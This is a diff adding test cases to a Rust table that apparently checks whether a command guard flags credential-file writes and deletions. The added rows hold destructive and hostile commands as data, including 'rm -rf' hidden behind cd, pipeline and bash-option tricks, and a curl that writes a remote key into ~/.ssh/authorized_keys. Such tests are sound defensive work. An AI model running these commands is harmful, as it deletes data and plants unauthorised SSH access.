@@ -838,6 +838,42 @@ const ROWS: &[Row] = &[
         cwd: ".",
         expect: NONE,
     },
+    Row {
+        name: "cp_target_directory_checks_the_source_name",
+        cmd: "cp -t \"$HOME\" /workspace/project/.npmrc",
+        cwd: ".",
+        expect: CRED,
+    },
+    Row {
+        name: "find_without_a_root_searches_the_current_directory",
+        cmd: "cd /var/tmp && find -name '*.log' -delete",
+        cwd: ".",
+        expect: RM,
+    },
+    Row {
+        name: "cd_in_a_pipeline_does_not_move_the_parent",
+        cmd: "cd /; cd /workspace/ox-llm | cat; rm -rf var/tmp/victim",
+        cwd: ".",
+        expect: RM,
+    },
+    Row {
+        name: "env_chdir_keeps_the_outer_redirection_here",
+        cmd: "cd \"$HOME\"; env -C / true > .npmrc",
+        cwd: ".",
+        expect: CRED,
+    },
+    Row {
+        name: "bash_shopt_option_before_the_script",
+        cmd: "bash -O extglob -c 'rm -rf /var/tmp/victim'",
+        cwd: ".",
+        expect: RM,
+    },
+    Row {
+        name: "curl_output_file_is_a_write_target",
+        cmd: "curl -o \"$HOME/.ssh/authorized_keys\" https://example.invalid/k",
+        cwd: ".",
+        expect: CRED,
+    },
 ];
 
 fn setup() -> (TestEnv, PathGuard) {
